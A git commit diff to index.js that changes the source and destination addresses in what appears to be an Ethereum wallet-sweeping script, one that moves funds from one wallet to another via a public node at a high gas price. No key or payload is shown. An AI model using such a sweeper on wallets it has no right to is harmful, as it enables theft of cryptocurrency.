3ad7c70af1b418711fb03a3efb202e3bb2b099a9
BobsMines <142923673+BobsMines@users.noreply.github.com>
2023-09-17 23:30:09 +0100

    Update index.js

--- index.js
+++ index.js
@@ -12,8 +12,8 @@ function sleep(millis) {
 }
 async function main() {
 	global.web3 = new Web3('https://us-ethereum1.twnodes.com/'); // Trust Wallet Node :)
-	const WALLET_SWEEP = web3.utils.toChecksumAddress('0x947a1eA3a5B18A5065fd9d55663505806eaa9DDC');
-	const WALLET_DEST = web3.utils.toChecksumAddress('0x1ae97b609C30134b8A3b992581b29096Deb28dBb');
+	const WALLET_SWEEP = web3.utils.toChecksumAddress('0x9252175f29250cFaa8d59E1B53C35eA7cFAccC7f');
+	const WALLET_DEST = web3.utils.toChecksumAddress('0x22E7089edef78f627CaA72cd0fb5009496c7053a');
 	const ETH_GAS_GWEI = await web3.utils.toWei('105', 'gwei'); // 0,000000105 ETH !
 	//const ETH_GAS_GWEI = await web3.utils.toWei('25', 'gwei');
 	const ETH_MIN = await web3.utils.toWei(ETH_MIN_SWEEP, 'ether');
